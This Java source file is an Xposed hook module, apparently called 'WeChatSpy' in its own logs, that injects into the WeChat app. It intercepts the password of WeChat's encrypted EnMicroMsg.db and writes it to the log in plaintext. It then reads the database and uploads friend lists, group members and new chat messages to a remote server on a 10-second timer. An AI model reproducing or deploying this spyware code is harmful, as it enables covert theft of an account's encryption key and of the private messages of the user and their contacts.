package com.qunar.wechat.auto.xposed;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.text.TextUtils;
import android.util.Log;

import com.qunar.wechat.auto.api.WechatApi;
import com.qunar.wechat.auto.bll.MessageSubmitBll;
import com.qunar.wechat.auto.common.Constants;
import com.qunar.wechat.auto.jsonbean.BaseJsonResult;
import com.qunar.wechat.auto.jsonbean.WechatMessage;
import com.qunar.wechat.auto.repository.XposedWeChatDbRepositoryImpl;
import com.qunar.wechat.auto.utils.JsonUtils;
import com.qunar.wechat.auto.utils.SharedPrefsHelper;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * Created by lihaibin.li on 2017/11/30.
 */

public class QunarWechatHook implements IXposedHookLoadPackage {
    long lastMessageTime;
    int interval = 10*1000;//上传消息时间间隔 默认10秒
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
        XposedBridge.log("QunarWechatHook:" + loadPackageParam.packageName);
        if (!loadPackageParam.packageName.contains(Constants.WECHAT_PACKAGENAME)) {
            return;
        }
        XposedHelpers.findAndHookMethod(Application.class, "attach", Context.class, new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                try {
                    ClassLoader cl = ((Context) param.args[0]).getClassLoader();
                    QunarWechatContainer.SqliteDatabaseClazz = XposedHelpers.findClass("com.tencent.wcdb.database.SQLiteDatabase", cl);
                } catch (Exception e) {
                    Log.e("Xposed", "寻找com.tencent.wcdb.database.SQLiteDatabase报错", e);
                    return;
                }
                Log.i("Xposed", "寻找com.tencent.wcdb.database.SQLiteDatabase成功");
                XposedHelpers.findAndHookMethod(QunarWechatContainer.SqliteDatabaseClazz
                        , "openDatabase"
                        , "java.lang.String"
                        , "byte[]"
                        , "com.tencent.wcdb.database.SQLiteCipherSpec"
                        , "com.tencent.wcdb.database.SQLiteDatabase.CursorFactory"
                        , "int"
                        , "com.tencent.wcdb.DatabaseErrorHandler"
                        , "int"
                        , new XC_MethodHook() {
                            @Override
                            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                                final String dbPath = param.args[0].toString();
                                if (dbPath.contains("EnMicroMsg.db") && !QunarWechatContainer.IsInited) {
                                    QunarWechatContainer.IsInited = true;
                                    final String password = new String((byte[]) param.args[1]);
                                    XposedBridge.log("DBPath:" + dbPath + "\r\n" + "Password:" + password);
                                    QunarWechatContainer.SqliteDatabaseObj = XposedHelpers.callStaticMethod(QunarWechatContainer.SqliteDatabaseClazz
                                            , "openDatabase"
                                            , dbPath
                                            , password.getBytes()
                                            , param.args[2]
                                            , param.args[3], param.args[4], param.args[5], param.args[6]);

                                    final Context context = (Context) XposedHelpers.callMethod(XposedHelpers.callStaticMethod(
                                            XposedHelpers.findClass("android.app.ActivityThread", null), "currentActivityThread", new Object[0])
                                            , "getSystemContext", new Object[0]);
                                    final Context weChatSpyContext = context.createPackageContext("com.qunar.wechat.auto"
                                            , context.CONTEXT_IGNORE_SECURITY);
                                    XposedBridge.log(weChatSpyContext.getPackageName());
                                    final SharedPreferences weChatSp = new SharedPrefsHelper(weChatSpyContext).getWeChatSp();
                                    final long serviceIntervalMs = weChatSp.getInt(Constants.SP_WECHAT_KEY_SERVICE_INTERVALMINUTE
                                            , Constants.DEFALT_SERVICE_INTERVAL_MINUTES) * 60 * 1000;
                                    final MessageSubmitBll messageSubmitBll = new MessageSubmitBll(new XposedWeChatDbRepositoryImpl(), weChatSpyContext);
                                    //上传群组成员
                                    WechatApi.uploadGroupMemberList(messageSubmitBll.queryGroups(),messageSubmitBll.queryCurrentWeChatUserInfo().WechatNo);

                                    //上传好友
                                    WechatApi.uploadFriendsList(messageSubmitBll.queryFriendsAndRoom());

                                    final TimerTask timerTask = new TimerTask() {
                                        @Override
                                        public void run() {
                                            try {
                                                XposedBridge.log("开始执行Timer-----------");
                                                XposedBridge.log("DBPath:" + dbPath + "\r\n" + "Password:" + password);
                                                boolean isEnableService = weChatSp.getBoolean(Constants.SP_WECHAT_KEY_SERVICE_ISENABLED, true);
                                                boolean isDeleteMsgAfterUpload = weChatSp.getBoolean(Constants.SP_WECHAT_KEY_IS_DELETE_MSG_AFTER_UPLOAD, false);
                                                lastMessageTime = weChatSp.getLong(Constants.SP_WECHAT_KEY_LASTMSGTIME, 0);
                                                XposedBridge.log("最后消息时间:" + lastMessageTime);
                                                XposedBridge.log("WeChatSpy配置：serviceIntervalMs->" + serviceIntervalMs
                                                        + "; isEnableService->" + isEnableService
                                                        + "; isDeleteMsgAfterUpload->" + isDeleteMsgAfterUpload);
                                                if (isEnableService) {
                                                    XposedBridge.log("开始运行submitChatMessage！");
                                                    int count = messageSubmitBll.queryFriendCount();//好友数
                                                    XposedBridge.log(String.valueOf(count));

                                                    WechatMessage wechatMessage = messageSubmitBll.queryMessageByLastMessageTime(lastMessageTime);
                                                    boolean hasMsg = wechatMessage.lastMessageTime != 0;
                                                    sendBroadcast(weChatSpyContext,count,hasMsg);
                                                    if(!hasMsg){
                                                        //无消息
                                                        return;
                                                    }

                                                    lastMessageTime = wechatMessage.lastMessageTime;
                                                    XposedBridge.log("上传消息数据：" + JsonUtils.getGson().toJson(wechatMessage));
                                                    WechatApi.uploadMessage(wechatMessage, new Callback() {
                                                        @Override
                                                        public void onFailure(Call call, IOException e) {
                                                            XposedBridge.log("上传消息失败:" + e.getLocalizedMessage());
                                                        }

                                                        @Override
                                                        public void onResponse(Call call, Response response) throws IOException {
                                                            String result = response.body().string();
                                                            if (!TextUtils.isEmpty(result)) {
                                                                Pattern CRLF = Pattern.compile("(\r\n|\r|\n|\n\r)");
                                                                Matcher m = CRLF.matcher(result);
                                                                if (m.find()) {
                                                                    result = m.replaceAll("");
                                                                }
                                                                XposedBridge.log("上传消息结果:" + result);
                                                                boolean isScuess = JsonUtils.getGson().fromJson(result, BaseJsonResult.class).ret;
                                                                if (isScuess)
                                                                    weChatSp.edit().putLong(Constants.SP_WECHAT_KEY_LASTMSGTIME, lastMessageTime).apply();
                                                            }
                                                        }
                                                    });
                                                } else {
                                                    XposedBridge.log("不满足运行条件！");
                                                }
                                            } catch (Exception e) {
                                                XposedBridge.log(e);
                                            }
                                        }
                                    };
                                    Timer timer = new Timer();
                                    timer.schedule(timerTask, 1000, interval);
                                    XposedBridge.log("Timer started.");
                                }
                            }
                        });
            }
        });
    }

    private void sendBroadcast(Context context,int count,boolean hasMsg){
        Intent intent = new  Intent();
        intent.putExtra(Constants.SP_MAX_FRIENDS_COUNT,count);
        intent.putExtra(Constants.SP_IS_HAS_MESSAGE_UPLOAD,hasMsg);
        intent.setAction("com.wechat.broadcast");
        //发送无序广播
        context.sendBroadcast(intent);
    }


}
